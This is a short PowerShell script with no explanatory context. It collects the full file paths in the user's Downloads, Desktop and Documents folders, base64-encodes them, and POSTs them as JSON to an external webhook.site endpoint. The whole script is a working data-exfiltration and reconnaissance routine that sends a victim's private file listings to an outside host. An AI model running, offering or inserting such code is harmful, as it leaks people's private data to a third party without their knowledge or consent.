$payload = @{
    Downloads = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Downloads").FullName -join "`n"))
    Desktop   = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Desktop").FullName -join "`n"))
    Documents = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem "$env:USERPROFILE\Documents").FullName -join "`n"))
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://webhook.site/3ae63ffc-283e-4b4e-bddd-af249a92e266" -Method Post -ContentType "application/json" -Body $payload